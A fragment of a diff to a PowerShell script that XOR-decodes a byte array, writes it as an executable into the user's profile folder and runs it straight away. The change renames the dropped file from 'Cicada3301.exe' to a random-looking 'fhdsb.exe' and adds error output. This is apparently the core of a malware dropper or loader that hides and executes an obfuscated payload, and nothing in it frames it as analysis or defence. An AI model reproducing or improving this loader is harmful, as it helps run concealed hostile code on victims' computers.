@@ -11,9 +11,10 @@ try {
     $o = [byte[]](0..($b.Length - 1) | ForEach-Object {
         $b[$_] -bxor $x[$_ % $x.Length]
     })
-    $file = "$env:USERPROFILE\Cicada3301.exe"
+    $file = "$env:USERPROFILE\fhdsb.exe"
     [IO.File]::WriteAllBytes($file, $o)
     & $file
 }
 catch {
+    Write-Host "Error: $($_.Exception.Message)"
 }
